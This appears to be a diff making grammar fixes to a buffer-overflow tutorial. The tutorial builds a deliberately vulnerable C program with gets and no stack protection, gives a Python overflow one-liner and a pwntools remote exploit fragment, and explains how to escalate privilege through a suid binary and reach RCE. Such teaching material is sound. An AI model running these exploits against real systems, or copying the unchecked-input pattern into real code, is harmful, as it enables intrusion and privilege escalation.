@@ -106,7 +106,7 @@ At the address of `0xffffd1d8` - `0xffffd1e8` you can see our values 1, 2, 3, 4,
 
 ## Exploitation
 
-So, I wrote a simple program that has a part with a `system` unix syscall to execute `/bin/sh`. You need to compile it without a stack protection.
+So, I wrote a simple program that has a part with a `system` Unix syscall to execute `/bin/sh`. You need to compile it without stack protection.
 
 ```C
 #include <unistd.h>
@@ -126,7 +126,7 @@ int main(int argc, char *argv[]){
 }
 ```
 
-Also, it used vulnerable function `gets`. But this is vulnerable because it doesn't check the input size. It may be also a programming mistake with `read`.
+Also, it used the vulnerable function `gets`. But this is vulnerable because it doesn't check the input size. It may be also a programming mistake with `read`.
 Okay, we know the size of buffer, buf if we wouldn't know, then you can see it in the gdb:
 
 ```bash
@@ -143,7 +143,7 @@ gcc buf-overflow.c -o buffer-overflow -fno-stack-protector
 (python -c 'print "A"*112 + "\xdd\xdd"'; cat) | ./buffer-overflow
 ```
 
-But, you don't get a shell, cause you overwritten the access variable with `0xdddd`. You can with what hex address it compares in the gdb:
+But, you don't get a shell, cause you overwrote the access variable with `0xdddd`. You can with what hex address it compares in the gdb:
 
 ```bash
    0x0000000000001194 <+43>:	cmp    DWORD PTR [rbp-0x4],0x4d2
@@ -155,7 +155,7 @@ So, your final exploit:
 (python -c 'print "A"*112 + "\xdd\xdd"'; cat) | ./buffer-overflow
 ```
 
-And you will get a shell, but you will be you, not the other user or root. Yeah, in this kind of program, the vulnerability is useless for an attacker, but if it has a `suid` bit set(`chmod ug+s buffer-overflow` as another user), he can get a root or another user privilege. But, if a program with some network interactions has this vulnerability, then the attacker can get Remote Code Execution or RCE, even if the program doesn't have a suid on root or other user. Also, the main reason for RCE here is condition which gives a shell, but even so, this vulnerability opens a thread to further exploitation.
+And you will get a shell, but you will be you, not the other user or root. Yeah, in this kind of program, the vulnerability is useless for an attacker, but if it has a `suid` bit set(`chmod ug+s buffer-overflow` as another user), he can get a root or another user privilege. But, if a program with some network interactions has this vulnerability, then the attacker can get Remote Code Execution or RCE, even if the program doesn't have a suid on the root or other user. Also, the main reason for RCE here is the condition which gives a shell, but even so, this vulnerability opens a thread to further exploitation.
 
 
 ### Remote exploit with pwntools
@@ -178,4 +178,4 @@ p.sendline(payload)
 p.interactive()
 ```
 
-One difference here is the offset between the buffer and the value to overwrite. This offset often can be different from local exploit.
+One difference here is the offset between the buffer and the value to overwrite. This offset often can be different from the local exploit.
